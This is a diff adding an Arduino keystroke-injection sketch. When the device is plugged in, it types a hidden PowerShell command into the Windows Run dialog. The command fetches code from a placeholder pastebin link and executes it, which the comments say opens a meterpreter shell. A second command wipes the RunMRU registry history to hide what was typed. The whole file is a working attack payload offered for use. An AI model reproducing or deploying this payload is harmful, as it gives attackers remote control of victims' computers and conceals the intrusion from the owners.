@@ -1,0 +1,47 @@
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  // Opens a meterpreter using a pastebin link
+  // See https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/remote_access/SingleSecondShell/readme.md
+  // For how to create a link to your personal shellcode
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("powershell -windowstyle hidden $u='YOUR_LINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("powershell -WindowStyle Hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"");
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
